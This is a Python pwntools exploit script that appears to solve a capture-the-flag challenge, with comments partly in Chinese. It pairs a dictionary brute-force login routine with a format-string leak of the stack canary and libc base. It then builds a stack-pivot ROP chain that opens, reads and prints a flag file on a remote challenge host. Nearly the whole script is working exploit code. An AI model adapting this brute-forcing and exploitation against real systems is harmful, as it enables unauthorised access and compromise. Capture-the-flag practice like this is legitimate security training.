from pwn import *
import time

lc = "./docker/pwn"
libc = "./libc.so.6"
libcrypto = "./libcrypto.so.3"
libseccomp = "./libseccomp.so.2"

elf = ELF(lc)
libc = ELF(libc)
libcrypto = ELF(libcrypto)
libseccomp = ELF(libseccomp)

context(os="linux", arch="amd64", log_level="debug")
context.terminal = ["tmux", "splitw", "-h"]

global p
def crash_passwd(lc, host="127.0.0.1", port=10000):
    flag = 0
    with open("user_dict") as fu:
        with open("pwd_dict") as fp:
            for i in fu:
                print(f"Crashing username: {fu}")
                for j in fp:
                    #p = process(lc)
                    #p = gdb.debug(lc, "b success")
                    p = remote(host, port)
                    time.sleep(0.3)
                    print(f"Crashing passwd: {fp}\n")
                    p.recvuntil(b"exit\n")
                    p.sendline(b"1")
                    # user & pwd end with \n''
                    p.sendafter(b"User: ", i, timeout=1)
                    p.sendafter(b"Passwd: ", j, timeout=1)
                    if p.recvuntil(b"\n", timeout=1).decode().find("incorrect") is not -1:
                        continue
                    user, pwd = i, j
                    print(f"User crashed: {user}\nPasswd found: {pwd}\n")
                    return user, pwd

def login(user, pwd, p):
    p.recvuntil(b"exit\n")
    p.sendline(b"1")
    p.sendafter(b"User: ", user, timeout=1)
    p.sendafter(b"Passwd: ", pwd, timeout=1)


#user, passwd = crash_passwd(lc)
user, passwd = "admin123\n", "123qwe\n"
#p = process(lc)
#p = gdb.debug(lc, "b success")

p = remote("node1.anna.nssctf.cn", 28293)

login(user, passwd, p)
#pause()
p.recvuntil(b'\n')

p.sendline(b"%13$p,%3$p") #canary->%13$p, write.got->(%3$p+offset)
leaked = p.recv(0x22).decode().split(',')
pause()

canary = int(leaked[0], 16)
write_got = int(leaked[1], 16) + 0x8e
print(f"Canary found: {hex(canary)}\nwrite@got leaked: {hex(write_got)}")
write_sym = libc.sym['write']
libc_base = write_got - write_sym
print(f"Libc base address leaked: {hex(libc_base)}")

padding = b'A' * 0x108 + p64(canary)

# gadget
pop_rdi = 0x401289
pop_rsi = 0x40128b
pop_rcx = 0x40128d
pop_rdx = 0x40128f
pop_rsp = 0x401291
pop_rbp = 0x401294
leave = 0x4013b5
lea_rax_rbp = 0x40163f # lea rax,[rbp-0x110];before smashing read
ret = 0x40101a

# function maybe need
open_func = libc.sym['open'] + libc_base
read_func = libc.sym['read'] + libc_base
write_func = write_got
exit_func = libc.sym['exit'] + libc_base
#main_func = 0x40164f

bss = 0x404200 # 0x4040d0 -> align to 0x404200

payload1 = padding + p64(bss+0x110) + p64(lea_rax_rbp)
p.send(payload1)
#pause()
filename = b'./flag\x00\x00'
# 此处fd指针并非默认3，需要从3开始尝试，本题fd=6
payload2 = filename + p64(canary) + p64(bss+0x10) + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0) + p64(open_func) # open("./flag", 0);
payload2 += p64(pop_rdi) + p64(6) + p64(pop_rsi) + p64(bss+0x200) + p64(pop_rdx) + p64(0x40) + p64(read_func) # read(6, bss+0x200, 0x40)
payload2 += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss+0x200) + p64(pop_rdx) + p64(0x40) + p64(write_func)# write(1, bss+0x200, 0x40)
payload2 += p64(pop_rdi) + p64(0) + p64(exit_func)
payload2 = payload2.ljust(0x110-0x8, b'\x00') + p64(canary) + p64(bss+0x10) + p64(leave)

p.send(payload2)
#pause()
p.interactive()

# 我们期望的 伪造栈 的结构：
# bss:			filename
# bss+0x8:		canary
# bss+0x10:		rbp -> &(next_stack_chunk)
# bss+0x18:		payload2
# ...
# bss+0x108:	canary
# bss+0x110:	rbp -> &(bss)